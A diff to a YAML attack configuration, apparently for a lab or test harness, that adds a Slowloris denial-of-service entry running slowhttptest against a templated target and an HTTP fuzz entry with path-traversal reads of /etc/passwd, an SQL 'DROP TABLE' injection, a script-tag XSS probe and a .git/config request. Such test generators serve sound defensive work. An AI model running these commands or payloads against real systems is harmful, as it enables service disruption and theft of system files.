@@ -57,6 +57,44 @@ attacks:
     repeats: 3
     duration_seconds: 60
 
+  # Application-layer (#77)
+  - name: slowloris
+    label: Slowloris
+    enabled: true
+    repeats: 3
+    command:
+      - slowhttptest
+      - -c
+      - "1000"
+      - -H
+      - -i
+      - "10"
+      - -r
+      - "200"
+      - -t
+      - GET
+      - -u
+      - http://{target_ip}/
+      - -x
+      - "24"
+      - -p
+      - "3"
+
+  - name: http_fuzz
+    label: HTTP_Fuzz
+    kind: http_fuzz
+    enabled: true
+    repeats: 3
+    port: 80
+    paths:
+      - /../../../../etc/passwd
+      - /..%2f..%2f..%2f..%2fetc%2fpasswd
+      - "/'; DROP TABLE users;--"
+      - "/<script>alert(1)</script>"
+      - /%00
+      - /.git/config
+    timeout_seconds: 5
+
   # - name: http_request
   #   label: HTTP_Request
   #   enabled: false
